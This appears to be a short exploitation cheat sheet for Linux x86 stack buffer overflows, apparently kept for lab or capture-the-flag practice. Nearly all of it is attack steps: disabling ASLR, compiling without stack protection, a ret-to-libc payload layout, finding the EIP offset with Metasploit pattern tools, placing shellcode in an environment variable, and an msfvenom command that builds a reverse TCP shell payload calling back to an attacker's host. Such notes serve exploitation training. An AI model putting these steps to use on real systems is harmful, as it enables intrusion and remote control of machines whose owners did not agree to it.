To check or disable ASLR    
`cat /proc/sys/kernel/randomize_va_space`    
`echo 0 > /proc/sys/kernel/randomize_va_space`

Check the binary
`checksec --file <binary>`

If "NX" is enabled use "ret-to-libc"    
Find the addresses of "system" and "exit", and of the env variable SHELL using findaddr, it there is none create your own    
```
(gdb) p system
...
(gdb) p exit
...
root@kali:~/Desktop# env | grep SHELL
SHELL=/bin/bash
...
```
Then the shellcode is `<padding> + <system() addr> + <exit() addr> + </bin/sh addr>`

Compile with no stack smashing protection    
`gcc -ggdb -fno-stack-protector <source file> -o <binary file>`

Try to crash doing this
```
./<binary> `python -c 'print ("A" * 100)'` a
```

On gdb do this
```
(gdb) r `python -c 'print ("A" * 500)'` a
```

Write shellcode to memory and get its address
```
export egg=`python -c 'print ("\x90" * 50) + "<shellcode \x00>"'`
./findaddr 
egg => 0xbffffcfb
```

Use [skeleton](scripts/skeleton.py) to find the offset

Use metasploit to create a pattern and replace on [skeleton](scripts/skeleton.py)    
`pattern_create.rb 2000`

When the program crashes use metasploit to find the offset    
`pattern_offset.rb <eip>`

Adjust [skeleton](scripts/skeleton.py) to have "B"'s on EIP    
```
payload = "\x41" * 132 + "\x42" * 4
payload += "\x43" * (2000 - len(payload))
```

Use metasploit to generate shellcode    
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=4444 -b "\x00\x0a\x0d"`

Adjust [skeleton](scripts/skeleton.py) to have the shellcode    
```
shellcode = (
...
)
 
payload = "\x41" * <offset> + "\xa8\xef\xff\xbf" + "\x90" * 200 + shellcode
payload += "\x43" * (2000 - len(payload))
```
